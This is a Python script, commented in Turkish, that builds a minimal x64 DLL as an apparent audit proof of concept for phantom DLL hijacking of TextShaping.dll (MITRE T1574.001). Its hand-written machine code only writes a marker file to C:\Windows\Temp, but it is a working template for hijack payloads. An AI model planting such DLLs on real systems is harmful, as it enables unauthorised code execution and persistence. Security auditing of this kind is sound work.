#!/usr/bin/env python3
# build_dll.py — Minimal x64 PE DLL olusturucu
# Cikti: TextShapingProof.dll
# Kullanim: python build_dll.py

import struct, os, sys

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "TextShapingProof.dll")

# ── Sabitler ────────────────────────────────────────────────────────────────
IMAGE_BASE  = 0x180000000
FILE_ALIGN  = 0x200
SECT_ALIGN  = 0x1000
TEXT_RVA    = 0x1000
RDATA_RVA   = 0x2000
TEXT_RAW    = 0x200   # .text file offset
RDATA_RAW   = 0x400   # .rdata file offset

PROOF_PATH = b"C:\\Windows\\Temp\\phantom_dll_proof.txt\x00"
PROOF_TEXT = (
    b"=== PHANTOM DLL HIJACKING - AUDIT KANITI ===\r\n"
    b"MITRE ATT&CK: T1574.001\r\n"
    b"Teknik: Phantom DLL Hijacking (WindowsApps/TextShaping.dll)\r\n"
)
PROOF_LEN = len(PROOF_TEXT)

IMPORTS = [b"CreateFileA\x00", b"WriteFile\x00", b"CloseHandle\x00"]
DLL_NAME = b"KERNEL32.dll\x00"

# ── .rdata layout hesapla ───────────────────────────────────────────────────
IDT_OFF  = 0          # import directory table
ILT_OFF  = 40         # import lookup table  (IDT: 2*20 = 40)
IAT_OFF  = ILT_OFF + (len(IMPORTS)+1)*8   # import address table
HN_OFF   = IAT_OFF + (len(IMPORTS)+1)*8   # hint/name table

# hint/name girisleri
hn_entries = []
off = HN_OFF
for name in IMPORTS:
    rva = RDATA_RVA + off
    raw = b"\x00\x00" + name
    if len(raw) % 2: raw += b"\x00"
    hn_entries.append((rva, raw))
    off += len(raw)

DLL_NAME_OFF  = off;  DLL_NAME_RVA  = RDATA_RVA + off
dll_name_raw  = DLL_NAME if len(DLL_NAME)%2==0 else DLL_NAME+b"\x00"
off += len(dll_name_raw)

PATH_OFF = off;  PATH_RVA = RDATA_RVA + off
off += len(PROOF_PATH)

TEXT_OFF = off;  TEXT_DATA_RVA = RDATA_RVA + off
off += len(PROOF_TEXT)

ILT_RVA = RDATA_RVA + ILT_OFF
IAT_RVA = RDATA_RVA + IAT_OFF

# ── x64 makine kodu (DllMain) ────────────────────────────────────────────────
def disp32(from_rva, target_rva):
    return struct.pack("<i", target_rva - from_rva)

code = bytearray()
code += b"\x55\x53\x57"          # push rbp/rbx/rdi
code += b"\x48\x83\xEC\x20"      # sub rsp, 0x20
code += b"\x83\xFA\x01"          # cmp edx, 1
jnz_pos = len(code)
code += b"\x75\x00"              # jnz .done (placeholder)

# CreateFileA(proof_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0x80, NULL)
code += b"\x48\x8D\x0D"
code += disp32(TEXT_RVA + len(code) + 4, PATH_RVA)  # lea rcx, proof_path
code += b"\xBA\x00\x00\x00\x40"                      # mov edx, GENERIC_WRITE
code += b"\x45\x33\xC0"                              # xor r8d, r8d
code += b"\x45\x33\xC9"                              # xor r9d, r9d
code += b"\xC7\x44\x24\x20\x02\x00\x00\x00"         # [rsp+32] = CREATE_ALWAYS
code += b"\xC7\x44\x24\x28\x80\x00\x00\x00"         # [rsp+40] = FILE_ATTRIBUTE_NORMAL
code += b"\x48\xC7\x44\x24\x30\x00\x00\x00\x00"     # [rsp+48] = NULL
code += b"\xFF\x15"
code += disp32(TEXT_RVA + len(code) + 4, IAT_RVA)   # call [CreateFileA]

code += b"\x48\x83\xF8\xFF"      # cmp rax, -1
je_inv = len(code)
code += b"\x74\x00"              # je .done (placeholder)
code += b"\x48\x89\xC7"         # mov rdi, rax (save handle)

# WriteFile(hFile, proof_text, PROOF_LEN, &bw, NULL)
code += b"\x48\x89\xF9"         # mov rcx, rdi
code += b"\x48\x8D\x15"
code += disp32(TEXT_RVA + len(code) + 4, TEXT_DATA_RVA)  # lea rdx, proof_text
code += b"\x41\xB8" + struct.pack("<I", PROOF_LEN)        # mov r8d, PROOF_LEN
code += b"\x4C\x8D\x4C\x24\x04"                          # lea r9, [rsp+4]
code += b"\x48\xC7\x44\x24\x20\x00\x00\x00\x00"          # [rsp+32] = NULL
code += b"\xFF\x15"
code += disp32(TEXT_RVA + len(code) + 4, IAT_RVA + 8)    # call [WriteFile]

# CloseHandle(hFile)
code += b"\x48\x89\xF9"         # mov rcx, rdi
code += b"\xFF\x15"
code += disp32(TEXT_RVA + len(code) + 4, IAT_RVA + 16)   # call [CloseHandle]

# .done:
done = len(code)
code[jnz_pos+1] = done - (jnz_pos+2)
code[je_inv+1]  = done - (je_inv+2)
code += b"\xB8\x01\x00\x00\x00"  # mov eax, 1
code += b"\x48\x83\xC4\x20"      # add rsp, 0x20
code += b"\x5F\x5B\x5D\xC3"      # pop rdi/rbx/rbp; ret

TEXT_CODE = bytes(code)

# ── .rdata binary ───────────────────────────────────────────────────────────
rdata = bytearray()
rdata += struct.pack("<IIIII", ILT_RVA, 0, 0, DLL_NAME_RVA, IAT_RVA)  # IDT[0]
rdata += b"\x00"*20                                                      # IDT null
for (rva, _) in hn_entries: rdata += struct.pack("<Q", rva)             # ILT
rdata += struct.pack("<Q", 0)
for (rva, _) in hn_entries: rdata += struct.pack("<Q", rva)             # IAT
rdata += struct.pack("<Q", 0)
for (_, raw) in hn_entries: rdata += raw                                 # Hint/Name
rdata += dll_name_raw
rdata += PROOF_PATH
rdata += PROOF_TEXT
RDATA = bytes(rdata)

# ── PE binary olustur ────────────────────────────────────────────────────────
def align(n, a): return (n + a - 1) & ~(a-1)

TEXT_RSIZ  = align(len(TEXT_CODE), FILE_ALIGN)
RDATA_RSIZ = align(len(RDATA),     FILE_ALIGN)
IMG_SZ     = align(RDATA_RVA + align(len(RDATA), SECT_ALIGN), SECT_ALIGN)

pe = bytearray(RDATA_RAW + RDATA_RSIZ)

# DOS header
pe[0:2] = b"MZ"
struct.pack_into("<I", pe, 0x3C, 0x40)  # e_lfanew

# NT headers
O = 0x40
struct.pack_into("<I",  pe, O,    0x4550)   # PE sig
O += 4
# COFF
struct.pack_into("<HHIIIHH", pe, O,
    0x8664, 2, 0, 0, 0, 240, 0x2022)
O += 20
# Optional header (PE32+)
P = O
struct.pack_into("<H",  pe, P,      0x020B)              # Magic
struct.pack_into("<I",  pe, P+4,    TEXT_RSIZ)            # SizeOfCode
struct.pack_into("<I",  pe, P+8,    RDATA_RSIZ)           # SizeOfInitData
struct.pack_into("<I",  pe, P+16,   TEXT_RVA)             # EP = DllMain
struct.pack_into("<I",  pe, P+20,   TEXT_RVA)             # BaseOfCode
struct.pack_into("<Q",  pe, P+24,   IMAGE_BASE)
struct.pack_into("<I",  pe, P+32,   SECT_ALIGN)
struct.pack_into("<I",  pe, P+36,   FILE_ALIGN)
struct.pack_into("<HH", pe, P+40,   6, 0)                 # OS ver
struct.pack_into("<HH", pe, P+48,   6, 0)                 # Subsystem ver
struct.pack_into("<I",  pe, P+56,   IMG_SZ)
struct.pack_into("<I",  pe, P+60,   0x200)                # SizeOfHeaders
struct.pack_into("<H",  pe, P+68,   3)                    # Subsystem CUI
struct.pack_into("<H",  pe, P+70,   0x0100)               # DllChars NX_COMPAT
struct.pack_into("<QQ", pe, P+72,   0x100000, 0x1000)     # Stack R/C
struct.pack_into("<QQ", pe, P+88,   0x100000, 0x1000)     # Heap  R/C
struct.pack_into("<I",  pe, P+108,  16)                   # NumDirEntries
DD = P + 112
struct.pack_into("<II", pe, DD+8,   RDATA_RVA+IDT_OFF, 40)        # Import Dir
struct.pack_into("<II", pe, DD+96,  IAT_RVA, (len(IMPORTS)+1)*8)  # IAT
O += 240
# Section headers
def sect(pe, off, name, vsz, rva, rsz, raw, chars):
    struct.pack_into("<8sIIIIIIHHI", pe, off,
        name.ljust(8,b"\x00"), vsz, rva, rsz, raw, 0, 0, 0, 0, chars)

sect(pe, O,    b".text",  len(TEXT_CODE), TEXT_RVA,  TEXT_RSIZ,  TEXT_RAW,  0x60000020)
sect(pe, O+40, b".rdata", len(RDATA),     RDATA_RVA, RDATA_RSIZ, RDATA_RAW, 0x40000040)

# Section data
pe[TEXT_RAW  : TEXT_RAW  + len(TEXT_CODE)] = TEXT_CODE
pe[RDATA_RAW : RDATA_RAW + len(RDATA)]     = RDATA

with open(OUT, "wb") as f:
    f.write(pe)

print("[+] Olusturuldu : " + OUT)
print("[+] Boyut       : " + str(len(pe)) + " bytes")
print("[+] DllMain RVA : 0x" + hex(TEXT_RVA)[2:].upper())
print("[+] IAT RVA     : 0x" + hex(IAT_RVA)[2:].upper())
print("[+] Kanit yolu  : C:\\Windows\\Temp\\phantom_dll_proof.txt")
